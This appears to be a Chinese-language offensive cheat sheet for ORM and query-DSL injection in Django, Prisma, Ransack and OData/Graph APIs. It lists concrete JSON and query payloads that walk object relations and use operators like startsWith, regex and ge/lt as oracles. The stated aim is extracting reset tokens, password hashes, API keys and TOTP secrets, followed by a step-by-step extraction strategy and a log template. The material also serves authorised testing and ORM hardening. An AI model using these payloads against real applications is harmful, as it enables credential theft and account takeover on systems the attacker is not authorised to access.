# ORM / Query DSL Injection

ORM 漏洞不一定表现为原始 SQL 拼接。风险点是“用户控制字段名、操作符、关系、select/include 或完整 where/filter 对象”，把受限查询扩成敏感数据 oracle。

## 判断入口

- Django/MongoEngine 风格：`filter(**request.data)`、`Q(**data)`、`field__lookup`。
- Prisma/Sequelize 风格：请求体直接进入 `where`、`select`、`include`、`orderBy`。
- Ransack/Rails：`q[user_reset_token_start]=x`、`field_predicate`。
- OData/Graph API：`$filter`、`$select`、`$expand`、导航属性。
- 动态字段选择：`fields=...`、`columns=...`、`sort=...`、`include=...`。

证据标准：同一数据集内，字段/关系/操作符变化能稳定改变结果数量、字段返回、排序、错误或耗时。

## 字段与操作符

先证明普通字段可控，再换成敏感字段或关系字段：

```json
{"username":"admin"}
{"password__startswith":"a"}
{"created_by__user__password__contains":"pbkdf"}
```

常见 lookup/oracle：

- 前缀：`startswith`、`startsWith`、`start`。
- 包含：`contains`、`icontains`、`cont`。
- 正则：`regex`、`iregex`、`matches`。
- 比较：`gt/gte/lt/lte`、OData `ge/lt`。
- 存在/空值：`not: null`、`isSet`、`$exists`。

## 关系遍历

ORM 关系是高价值泄露面：从当前可见对象沿 `createdBy/user/groups/permissions/departments/employees` 等关系跳到其他用户，再对敏感字段建 oracle。

```json
{"createdBy":{"resetToken":{"startsWith":"0"}}}
{"created_by__user__groups__user__password__startswith":"a"}
```

如果应用强制 `is_secret=false` 或 `published=true`，尝试通过多对多关系“绕回”受保护对象，让过滤条件作用在公开对象、泄露字段来自关联对象。

## select/include/expand

当接口允许选择返回字段时，先测试低敏字段，再请求敏感字段或关系：

```json
{"select":{"createdBy":{"select":{"password":true}}}}
{"include":{"createdBy":true}}
```

OData/Graph 风格：

```text
$select=id,title&$expand=createdBy($select=username,token)
$filter=createdBy/token ge 'm'&$top=1
```

能返回字段不等于注入；需要证明用户本不应访问该字段或能用该字段控制结果。

## 类型混淆与解析器

等值校验如果未做 schema 验证，可能接受对象操作符：

```json
{"resetToken":{"not":"x"}}
{"resetToken":{"startsWith":"0"}}
```

URL-encoded、query、cookie JSON 与 body JSON 可能走不同 parser；同一 payload 换载体时重新建 oracle。

## 提取策略

1. 用已知字段校准大小写、排序和返回 marker。
2. 用 `startsWith/contains/ge/lt` 建前缀或二分 oracle。
3. 对 token/哈希优先候选字符集；对大小写敏感值先确认 collation。
4. 只提取能推进的字段：reset token、password hash、role、flag、API key、TOTP secret。
5. 一旦拿到可用 token/role/凭据，切回正常业务流验证权限。

## 卡点记录

```text
dsl:
parser:
controlled_parts: field | operator | relation | select | include | order
oracle:
true_request:
false_request:
leak_path:
blocked_by:
next_probe:
```
